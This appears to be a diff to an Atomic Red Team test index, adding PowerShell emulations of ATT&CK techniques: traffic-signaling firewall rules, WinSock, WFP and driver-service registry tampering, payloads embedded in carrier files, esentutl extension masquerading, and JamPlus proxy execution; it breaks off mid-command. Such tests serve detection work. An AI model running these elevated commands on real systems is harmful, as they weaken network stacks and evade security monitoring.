@@ -147,7 +147,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.619Z'
-      name: Socket Filters
+      name: 'Traffic Signaling: Socket Filters'
       description: |-
         Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.
 
@@ -175,7 +175,203 @@ stealth:
       - macOS
       - Windows
       x_mitre_version: '2.0'
-    atomic_tests: []
+      identifier: T1205.002
+    atomic_tests:
+    - name: T1205.002 - Add Custom Firewall Rule for Traffic Signaling Simulation
+      auto_generated_guid: c33f6e7b-87f9-45be-be0e-8eaa0616034d
+      description: 'Simulates an adversary creating a custom inbound firewall rule
+        designed to act as a traffic signaling trigger for backdoor activation.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-NetFirewallRule -DisplayName "T1205_Signal_Knock_Rule" -Direction
+          Inbound -Protocol TCP -LocalPort 31337 -Action Allow -Description "Simulated
+          traffic signaling trigger rule"; Write-Host "[+] Simulated port knocking
+          signal rule created."
+        cleanup_command: Remove-NetFirewallRule -DisplayName "T1205_Signal_Knock_Rule"
+          -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up signal firewall
+          rule."
+    - name: T1205.002 - Register Custom WinSock Protocol Catalog Entry
+      auto_generated_guid: 90fd1078-149b-4da4-b0f7-1113030dd8ae
+      description: 'Simulates an adversary modifying WinSock protocol catalogs (`Protocol_Catalog9`)
+        to register a custom packet interception provider.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Name "PackedCatalogItem" -Value ([byte[]](0..31))
+          -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Name "DisplayName" -Value "Simulated Filter Provider"
+          -ErrorAction SilentlyContinue; Write-Host "[+] Simulated WinSock protocol
+          catalog modification executed."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog
+          Entries\000000000099" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host
+          "[+] Cleaned up simulated WinSock catalog entry."
+    - name: T1205.002 - Register Custom WinSock Name Space Provider (NSP) Stub
+      auto_generated_guid: 4ddd4d04-e0f9-4273-9d6f-59f18f0af5f6
+      description: 'Simulates an adversary adding a custom WinSock Name Space Provider
+        to intercept name resolution and socket binding requests.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Name "DisplayName" -Value "Simulated NSP Filter"
+          -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Name "LibraryPath" -Value "C:\Windows\System32\simulated_nsp.dll"
+          -ErrorAction SilentlyContinue; Write-Host "[+] Simulated WinSock NSP catalog
+          injection executed."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog
+          Entries\000000000099" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host
+          "[+] Cleaned up simulated WinSock NSP entry."
+    - name: T1205.002 - Simulate Packet Capture Driver Service Registration
+      auto_generated_guid: '0284704c-59a0-44f2-b613-c10cc61b6b65'
+      description: 'Simulates an adversary registering a rogue kernel-level packet
+        capture driver service to intercept raw network traffic.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Name "ImagePath" -Value "system32\drivers\simulated_capture.sys" -ErrorAction
+          SilentlyContinue; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Name "Type" -Value 1 -ErrorAction SilentlyContinue; Set-ItemProperty -Path
+          "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture" -Name "Start"
+          -Value 3 -ErrorAction SilentlyContinue; Write-Host "[+] Simulated packet
+          capture driver service registered."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\T1205PacketCapture"
+          -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          simulated driver service registration."
+    - name: T1205.002 - Register Custom WFP Callout Provider Registry Key
+      auto_generated_guid: e46b7c40-2b5b-493a-a7b3-63377ae21e6c
+      description: 'Simulates an adversary registering a Windows Filtering Platform
+        callout provider registry configuration to hook deep packet inspection points.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Providers\{11111111-2222-3333-4444-555555555555}"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Providers\{11111111-2222-3333-4444-555555555555}"
+          -Name "DisplayName" -Value "T1205_Simulated_Callout_Provider" -ErrorAction
+          SilentlyContinue; Write-Host "[+] Simulated WFP callout provider registry
+          key added."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Providers\{11111111-2222-3333-4444-555555555555}"
+          -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          simulated WFP callout provider."
+    - name: T1205.002 - Modify TCPIP Parameter Registry for Raw Socket Behavior
+      auto_generated_guid: 254ebca5-a2d5-4831-af33-67d669b8309a
+      description: 'Simulates adversary adjustment of network stack registry configurations
+        to alter raw socket handling and packet inspection thresholds.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+          -Name "MaxRawSockets" -Value 500 -ErrorAction SilentlyContinue; Write-Host
+          "[+] Simulated TCPIP raw socket parameter modified."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+          -Name "MaxRawSockets" -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned
+          up TCPIP raw socket parameter."
+    - name: T1205.002 - Register Winsock Transport Filter Layer Provider
+      auto_generated_guid: 3bed0acb-e95a-492e-845d-adf05a0c4108
+      description: 'Simulates adversary registration of a Winsock Layered Service
+        Provider (LSP) or transport filter key in the networking stack.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: $val = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "ProviderOrder" -ErrorAction SilentlyContinue).ProviderOrder; Set-ItemProperty
+          -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "T1205_BackupOrder" -Value $val -ErrorAction SilentlyContinue; Set-ItemProperty
+          -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "ProviderOrder" -Value "$val,SimulatedProvider" -ErrorAction SilentlyContinue;
+          Write-Host "[+] Simulated Winsock provider order modification applied."
+        cleanup_command: $backup = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "T1205_BackupOrder" -ErrorAction SilentlyContinue).T1205_BackupOrder;
+          if ($null -ne $backup) { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "ProviderOrder" -Value $backup }; Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\ProviderOrder"
+          -Name "T1205_BackupOrder" -ErrorAction SilentlyContinue; Write-Host "[+]
+          Cleaned up Winsock provider order."
+    - name: T1205.002 - Inject Simulated Socket Filter Helper Key in NetworkStack
+      auto_generated_guid: 58dbc799-5344-4fcd-819d-8c3713011c1f
+      description: 'Simulates an adversary injecting network stack helper configuration
+        keys to monitor raw socket states for trigger packets.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkInformation"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkInformation"
+          -Name "SimulatedFilterState" -Value 1 -ErrorAction SilentlyContinue; Write-Host
+          "[+] Simulated network stack helper key injected."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkInformation"
+          -Name "SimulatedFilterState" -ErrorAction SilentlyContinue; Write-Host "[+]
+          Cleaned up simulated network stack helper key."
+    - name: T1205.002 - Register Custom WFP Sublayer Registry Key
+      auto_generated_guid: e631d66d-ed47-4b96-9ff9-ae7bc0d9efbf
+      description: 'Simulates an adversary creating a custom WFP sublayer registry
+        configuration to manage high-priority packet filtering rules.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\SubLayers\{99999999-8888-7777-6666-555555555555}"
+          -Force; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\SubLayers\{99999999-8888-7777-6666-555555555555}"
+          -Name "DisplayName" -Value "T1205_Simulated_Sublayer" -ErrorAction SilentlyContinue;
+          Write-Host "[+] Simulated WFP sublayer registry key added."
+        cleanup_command: Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\SubLayers\{99999999-8888-7777-6666-555555555555}"
+          -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          simulated WFP sublayer."
+    - name: T1205.002 - Create Raw Socket Binding Persistence Hook Registry
+      auto_generated_guid: e69a8f7f-13d2-47fb-94cf-17471a5636a6
+      description: 'Simulates an adversary adding a networking hook parameter registry
+        entry to initialize custom socket filter hooks at system startup.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards"
+          -Name "T1205_HookState" -Value 1 -ErrorAction SilentlyContinue; Write-Host
+          "[+] Simulated network card hook key created."
+        cleanup_command: Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\NetworkCards" -Name "T1205_HookState" -ErrorAction SilentlyContinue;
+          Write-Host "[+] Cleaned up network card hook key."
   T1027.011:
     technique:
       type: attack-pattern
@@ -798,7 +994,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.620Z'
-      name: Embedded Payloads
+      name: 'Obfuscated Files or Information: Embedded Payloads'
       description: "Adversaries may embed payloads within other files to conceal malicious
         content from defenses. Otherwise seemingly benign files (such as scripts and
         executables) may be abused to carry and obfuscate malicious payloads and content.
@@ -837,7 +1033,301 @@ stealth:
       - macOS
       - Windows
       x_mitre_version: '2.0'
-    atomic_tests: []
+      identifier: T1027.009
+    atomic_tests:
+    - name: Embed Simulated Payload Overlay in Carrier Executable
+      auto_generated_guid: '09b8f49c-58b8-49f4-bec7-d80d9163fb5c'
+      description: |
+        Simulates an adversary appending non-executing payload data as an overlay
+        to a carrier executable file. The appended data is not executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        carrier_path:
+          description: Path to the carrier executable file
+          type: path
+          default: "$env:TEMP\\T1027_009_carrier.exe"
+        embedded_payload:
+          description: Simulated non-executing payload data appended to the carrier
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if (Test-Path "#{carrier_path}") { Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue }
+          [System.IO.File]::WriteAllBytes("#{carrier_path}", [byte[]](0..127))
+          [System.IO.File]::AppendAllText("#{carrier_path}", "#{embedded_payload}")
+          Write-Host "Embedded payload overlay appended to #{carrier_path}"
+        cleanup_command: 'Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Simulated Payload Data in Carrier Image File
+      auto_generated_guid: 4f37ebea-bfaa-41c7-97bd-08bba0b8855d
+      description: |
+        Simulates an adversary appending non-executing payload data beyond the
+        declared content of a carrier image file. The payload is not executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        carrier_path:
+          description: Path to the carrier image file
+          type: path
+          default: "$env:TEMP\\T1027_009_carrier.png"
+        embedded_payload:
+          description: Simulated non-executing payload data appended to the image
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if (Test-Path "#{carrier_path}") { Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue }
+          [System.IO.File]::WriteAllBytes("#{carrier_path}", [byte[]](137,80,78,71,13,10,26,10,0,0,0,13))
+          [System.IO.File]::AppendAllText("#{carrier_path}", "#{embedded_payload}")
+          Write-Host "Embedded payload data appended to #{carrier_path}"
+        cleanup_command: 'Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Simulated Payload Data in Carrier PDF File
+      auto_generated_guid: 53b9902a-5ba5-4217-93e7-5d5571d163b4
+      description: |
+        Simulates an adversary appending non-executing payload data beyond the
+        declared content of a carrier PDF document. The payload is not executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        carrier_path:
+          description: Path to the carrier PDF file
+          type: path
+          default: "$env:TEMP\\T1027_009_carrier.pdf"
+        embedded_payload:
+          description: Simulated non-executing payload data appended to the PDF
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if (Test-Path "#{carrier_path}") { Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue }
+          [System.IO.File]::WriteAllBytes("#{carrier_path}", [byte[]](37,80,68,70,45,49,46,52,10))
+          [System.IO.File]::AppendAllText("#{carrier_path}", "#{embedded_payload}")
+          Write-Host "Embedded payload data appended to #{carrier_path}"
+        cleanup_command: 'Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in INI Configuration File
+      auto_generated_guid: 1920a80e-7376-4d9f-afe9-1c7f8b0882ba
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        an otherwise benign INI configuration file.
+      supported_platforms:
+      - windows
+      input_arguments:
+        config_path:
+          description: Path to the INI configuration carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_settings.ini"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $configContent = @"
+          [Settings]
+          application=legitimate-application
+          update_url=https://example.invalid
+          embedded_payload=#{embedded_payload}
+          "@
+          Set-Content -Path "#{config_path}" -Value $configContent -Force
+          Write-Host "Base64 payload string embedded in #{config_path}"
+        cleanup_command: 'Remove-Item "#{config_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in JSON Configuration File
+      auto_generated_guid: 025544b0-07ab-4fa3-97b3-17da2343a5eb
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        an otherwise benign JSON configuration file.
+      supported_platforms:
+      - windows
+      input_arguments:
+        config_path:
+          description: Path to the JSON configuration carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_settings.json"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $json = @{
+            application = "legitimate-application"
+            update_url = "https://example.invalid"
+            embedded_payload = "#{embedded_payload}"
+          } | ConvertTo-Json
+          Set-Content -Path "#{config_path}" -Value $json -Force
+          Write-Host "Base64 payload string embedded in #{config_path}"
+        cleanup_command: 'Remove-Item "#{config_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in XML Resource File
+      auto_generated_guid: 75edafa4-60c0-45bb-8900-d0805d9f029f
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        an otherwise benign XML resource file.
+      supported_platforms:
+      - windows
+      input_arguments:
+        resource_path:
+          description: Path to the XML resource carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_resource.xml"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $xmlContent = @"
+          <?xml version="1.0" encoding="utf-8"?>
+          <configuration>
+            <application>legitimate-application</application>
+            <embeddedPayload>#{embedded_payload}</embeddedPayload>
+          </configuration>
+          "@
+          Set-Content -Path "#{resource_path}" -Value $xmlContent -Force
+          Write-Host "Base64 payload string embedded in #{resource_path}"
+        cleanup_command: 'Remove-Item "#{resource_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in CSV Data File
+      auto_generated_guid: 82084e9b-6e80-43b5-8716-5d6b36579f53
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        a metadata field of an otherwise benign CSV data file.
+      supported_platforms:
+      - windows
+      input_arguments:
+        csv_path:
+          description: Path to the CSV data carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_export.csv"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $csvContent = @"
+          id,name,metadata
+          1,legitimate-record,#{embedded_payload}
+          "@
+          Set-Content -Path "#{csv_path}" -Value $csvContent -Force
+          Write-Host "Base64 payload string embedded in #{csv_path}"
+        cleanup_command: 'Remove-Item "#{csv_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in PowerShell Script Carrier
+      auto_generated_guid: 8112d9ba-fac8-41c3-9aa9-595246be967a
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        a PowerShell script file. The script is created but not executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_path:
+          description: Path to the PowerShell script carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_carrier.ps1"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $scriptContent = "# Simulated embedded payload carrier`r`n" +
+                           "`$embeddedPayload = '#{embedded_payload}'"
+          Set-Content -Path "#{script_path}" -Value $scriptContent -Force
+          Write-Host "Base64 payload string embedded in #{script_path}"
+        cleanup_command: 'Remove-Item "#{script_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in Windows Script File Carrier
+      auto_generated_guid: f989c010-dc48-41e7-83b8-a0b781e76a0f
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        a Windows Script File. The script file is created but not executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_path:
+          description: Path to the Windows Script File carrier
+          type: path
+          default: "$env:TEMP\\T1027_009_carrier.wsf"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $wsfContent = @"
+          <?xml version="1.0" encoding="utf-8"?>
+          <job>
+            <script language="VBScript">
+              Const embeddedPayload = "#{embedded_payload}"
+            </script>
+          </job>
+          "@
+          Set-Content -Path "#{script_path}" -Value $wsfContent -Force
+          Write-Host "Base64 payload string embedded in #{script_path}"
+        cleanup_command: 'Remove-Item "#{script_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Hex-Encoded Simulated Shellcode String in Text Carrier
+      auto_generated_guid: a50df5f9-8961-4e0c-bb62-bf0614ddae94
+      description: |
+        Simulates an adversary embedding a hexadecimal representation of
+        simulated shellcode within an otherwise benign text file. The shellcode
+        representation is not decoded or executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        text_path:
+          description: Path to the text carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_notes.txt"
+        embedded_payload:
+          description: Hex-encoded simulated shellcode representation
+          type: string
+          default: 9090909031c050682f2f7368
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $textContent = @"
+          Meeting notes
+          Reference: #{embedded_payload}
+          "@
+          Set-Content -Path "#{text_path}" -Value $textContent -Force
+          Write-Host "Hex-encoded simulated shellcode string embedded in #{text_path}"
+        cleanup_command: 'Remove-Item "#{text_path}" -Force -ErrorAction SilentlyContinue
+
+          '
   T1564.012:
     technique:
       type: attack-pattern
@@ -5037,6 +5527,46 @@ stealth:
           taskkill /IM Calculator.exe /f >$null 2>$null
           Remove-Item "$env:userprofile\Downloads\T1036" -recurse -ErrorAction Ignore
         name: powershell
+    - name: Masquerading File Extension Restoration via PowerShell and esentutl
+      auto_generated_guid: ba3f1b66-0c42-4cef-b316-12cff72b70db
+      description: "Simulates the technique of restoring or altering file extensions
+        using the built-in Windows database utility esentutl.exe via PowerShell. \nThreat
+        actors such as menuPass (G0045) have leveraged esentutl to copy and rename
+        files (such as changing payloads masquerading as .txt back to true executable
+        types) to evade defenses and bypass simple name-based monitoring.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        workdir:
+          description: Working directory path to stage the files.
+          type: path
+          default: C:\Users\Public\Libraries\staging
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $WorkDir = "#{workdir}"
+          if (-not (Test-Path -Path $WorkDir)) {
+              New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
+          }
+          $SourceFile = Join-Path $WorkDir "payload.txt"
+          $DestFile   = Join-Path $WorkDir "payload.exe"
+          "This is actually a malicious executable" | Out-File -FilePath $SourceFile -Encoding ascii -Force
+          $EsentutlArgs = @("/y", $SourceFile, "/d", $DestFile, "/o")
+          $null = & "esentutl.exe" @EsentutlArgs 2>&1
+          if (Test-Path -Path $DestFile) {
+              Write-Host "  -> Copied payload.txt to payload.exe (true extension revealed)"
+          } else {
+              Write-Host "  [!] esentutl copy failed"
+          }
+        cleanup_command: |
+          Remove-Item -Path "C:\Users\Public\Libraries\staging\payload.txt" -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path "C:\Users\Public\Libraries\staging\payload.exe" -Force -ErrorAction SilentlyContinue
+          if (Test-Path "C:\Users\Public\Libraries\staging") {
+              if ((Get-ChildItem "C:\Users\Public\Libraries\staging").Count -eq 0) {
+                  Remove-Item -Path "C:\Users\Public\Libraries\staging" -Force
+              }
+          }
   T1070.008:
     technique:
       type: attack-pattern
@@ -8855,7 +9385,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.645Z'
-      name: JamPlus
+      name: 'Trusted Developer Utilities Proxy Execution: JamPlus'
       description: |-
         Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.(Citation: JamPlus manual)
 
@@ -8875,7 +9405,312 @@ stealth:
       - Windows
       x_mitre_version: '2.0'
       x_mitre_remote_support: false
-    atomic_tests: []
+      identifier: T1127.003
+    atomic_tests:
+    - name: JamPlus proxy execution - launch calc.exe via Jamfile.jam action
+      auto_generated_guid: 5f7f863b-b6e5-4eb3-98af-9844d194137e
+      description: |
+        Writes a minimal Jamfile.jam whose build action shell-executes calc.exe, then invokes jam.exe against it. Mirrors the reported abuse pattern of using JamPlus's build actions to proxy execution of an arbitrary binary from a reputable developer tool.
+        Expected output: calc.exe launches as a child process of jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test1"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              calc.exe
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: 'Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+          '
+    - name: JamPlus proxy execution - launch PowerShell via Jamfile.jam action
+      auto_generated_guid: 51b6913b-f96a-4d18-9802-41d4c5d4f995
+      description: |
+        Writes a Jamfile.jam whose build action invokes powershell.exe to write a marker file, simulating an adversary using JamPlus to proxy execution of a PowerShell payload rather than a GUI binary.
+        Expected output: a marker file is created by the powershell.exe process spawned from jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test2"
+        marker_file:
+          description: File the proxied PowerShell process will create
+          type: path
+          default: "$env:TEMP\\T1127.003_marker.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
